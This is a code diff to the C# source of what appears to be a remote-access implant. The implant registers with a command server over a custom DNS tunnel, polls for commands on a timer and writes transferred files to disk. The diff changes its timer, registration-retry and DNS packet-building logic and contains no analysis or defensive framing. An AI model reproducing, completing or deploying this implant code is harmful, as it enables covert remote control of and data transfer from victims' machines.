@@ -69,16 +69,18 @@ namespace Implant
                 domain = "." + domain;
             }
             Dest = new DNSModule(Config.Ip, Config.Port, domain, Config.Recursive);
-            Task.Factory.StartNew(() =>
+
+		Task.Factory.StartNew(() =>
             {
                 Registration();
-                Start();
+                
             }, TaskCreationOptions.LongRunning);
 
             // wait until the exit command is invoked
             
             
             _waitLock.Wait();
+	    
         }
         static void Registration()
         {
@@ -101,6 +103,7 @@ namespace Implant
                 confirmationID = Register();
                 Id = confirmationID;
             }
+	Start();
 
         }
 
@@ -108,19 +111,22 @@ namespace Implant
         {
 
             InitTimer();
-            _timer.Start();
+            //_timer.Start();
+            _timer.Enabled = true;
+            new System.Threading.ManualResetEvent(false).WaitOne();
         }
 
         private static void OnTimedEvent(Object source, System.Timers.ElapsedEventArgs e)
         {
-            _timer.Stop();
+            _timer.Enabled = false;
             var nextMessage = GetNextCommand();
             if (nextMessage != null)
             {
                 nextMessage.Command = nextMessage.Command.Trim();
                 if (nextMessage.Command == Const.Register || nextMessage.Command == Const.Error)
                 {
-                    Register();
+		    _timer.Enabled = false;
+                    Registration();
                 }
                 else
                 {
@@ -128,7 +134,7 @@ namespace Implant
                 }
 
             }
-            _timer.Start();
+            _timer.Enabled = true;
         }
 
 
@@ -211,7 +217,7 @@ namespace Implant
                                     try
                                     {
                                         string path;
-                                        if (!IncomingFile.LocalPath.Contains(Path.DirectorySeparatorChar))
+                                        if (!IncomingFile.LocalPath.Contains(Path.DirectorySeparatorChar.ToString()))
                                         {
                                             // TODO: verificare se funzia :)
                                             path = Path.Combine(Directory.GetCurrentDirectory(), IncomingFile.LocalPath);
@@ -330,7 +336,7 @@ namespace Implant
                     while (String.IsNullOrEmpty(responseString))
                     {
                         responseString = Dest.Send(b64registration, 0);
-                        System.Threading.Thread.Sleep(Config.TimeToWait);
+                        
                     }
                     var response = new Message(responseString);
                     confirmation = response.Decrypt(sessionKey);
@@ -1003,18 +1009,17 @@ namespace Implant
             }
 
             packet[byteCount+this.SD.Length] = 0x00;
-            packet[byteCount+this.SD.Length+1] = 0x00;
             if (last)
             {
-                packet[byteCount+this.SD.Length+2] = 0x10;
+                packet[byteCount+this.SD.Length+1] = 0x10;
             }
             else
             {
-                packet[byteCount+this.SD.Length+2] = 0x01;
+                packet[byteCount+this.SD.Length+1] = 0x01;
             }
 
-            packet[byteCount+this.SD.Length+3] = 0x00;
-            packet[byteCount+this.SD.Length+4] = 0x01;
+            packet[byteCount+this.SD.Length+2] = 0x00;
+            packet[byteCount+this.SD.Length+3] = 0x01;
         }
 
         private void PadPacket1(ref byte[] packet)
